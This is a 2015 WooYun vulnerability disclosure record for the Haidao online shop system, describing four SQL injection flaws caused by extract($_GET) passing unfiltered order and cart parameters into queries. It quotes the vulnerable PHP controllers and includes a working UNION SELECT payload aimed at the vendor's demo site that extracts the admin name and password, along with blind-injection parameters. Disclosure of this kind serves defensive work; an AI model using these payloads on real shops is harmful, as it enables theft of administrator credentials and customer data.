{"id": 84855, "wybug_id": "wooyun-2015-0140025", "wybug_title": "Haidao网店系统 最新版 4处sql注入打包", "wybug_corp": "www.haidao.la", "wybug_author": "路人甲", "wybug_date": "2015-09-10 14:43", "wybug_open_date": "2015-12-10 12:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-14：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向公众公开  简要描述： v1.12.3.150828注入打包。官网demo测试 详细说明：  #1/www/appliaction/Controller/User/OrderController.class.php\npublic function detail() {\t\textract($_GET);\t\t$rs = $this->getInfo($order_sn);\t\tif(!$rs) {\t\t\tshowmessage($this->errMsg);\t\t}\t\t$delivery = $rs['_delivery'];\t\t$_config = $this->_config[$rs['pay_type']];\t\t$tracks = model('order_track')->fetch_all_by_order_sn($order_sn);\t\t$SEO = seo(0, '订单详情');\t\tinclude template('order_detail');\t}\nextract($_GET) 后 getInfo($order_sn)跟到 getInfo\nprivate function getInfo($order_sn = '') {\t\tif(empty($order_sn)) {\t\t\t$this->errMsg = '参数错误';\t\t\treturn FALSE;\t\t}\t\t$sqlmap = array();\t\t$sqlmap['user_id'] = $this->userid;\t\t$sqlmap['order_sn'] = $order_sn;\t\t$rs = $this->db->where($sqlmap)->find();\n没有过滤带入了查询。官网测试下http://demo.haidao.la/index.php?m=user&c=Order&a=detailpost:\norder_sn[0]=%3d1) UNION /*!50000SELECT*/ 1,2,3,4,5,6,7,8,9,10,11,12,13,(/*!50000select*/name%0a/*!50000from*/hd_admin_user limit 1),(/*!50000select*/password%0a/*!50000from*/hd_admin_user limit 1),16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45%23in\n\n\n#2/appliaction/Controller/Goods/CartController.class.php\npublic function update() {        extract($_GET);        $result = $this->Cart->updateItem($timestamp, $num);        if(!$result) {            showmessage('购物车更新失败');        } else {            showmessage('购物车更新成功', U('index'), 1);        }    }public function updateItem($timestamp, $num) {    \tif(empty($timestamp)) return FALSE;    \t$num = $num;    \tif ($this->uid) {            $sqlmap = array();            $sqlmap['user_id'] = $this->uid;            $sqlmap['key'] = $timestamp;            if($num > 0) {                        \t$this->cart_db->where($sqlmap)->setField('num', $num);            } else {            \t$this->cart_db->where($sqlmap)->delete();            }    \t} else {    \t\t$all_item = json_decode(cookie('Cart'), TRUE);    \t\tif (!$all_item || !$all_item[$timestamp]) return FALSE;            if($num > 0) {            \tlist($goods_id, $product_id, $number) = str2arr($all_item[$timestamp]);            \t$all_item[$timestamp] = $goods_id.','.$product_id.','.$num;            \tcookie('Cart', json_encode($all_item));            } else {            \tunset($all_item[$timestamp]);            }    \t\t    \t}        $this->getAll();    \treturn TRUE;    }\n盲注。http://localhost:801/index.php?m=Goods&c=cart&a=updatepost:timestamp[0]=xxxxxin&num=1\n\n#3/appliaction/Controller/User/OrderController.class.php\npublic function comment() {\t\textract($_GET);\t\t$rs = $this->getInfo($order_sn);......\nhttp://demo.haidao.la/index.php?m=user&c=Order&a=commentpost: order_sn 参数也是个盲注#4/appliaction/Controller/User/OrderReturnController.class.php\npublic function order_return() {\t\textract($_GET);\t\t$order_info = $this->getInfo($order_sn);...private function getInfo($order_sn = '') {\t\tif(empty($order_sn)) {\t\t\t$this->errMsg = '参数错误';\t\t\treturn FALSE;\t\t}\t\t$sqlmap = array();\t\t$sqlmap['user_id'] = $this->userid;\t\t$sqlmap['order_sn'] = $order_sn;\t\t$rs = $this->order_db->where($sqlmap)->find();...\nhttp://localhost:801/index.php?m=user&c=OrderReturn&a=order_returnorder_sn参数。 同上。盲注的测试脚本 见http://**.**.**.**/bugs/wooyun-2015-0136380 改下就好了。   漏洞证明：  \n\n\n\n   修复方案：  过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-09-11 12:41 厂商回复： 感谢对海盗云商的关注，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}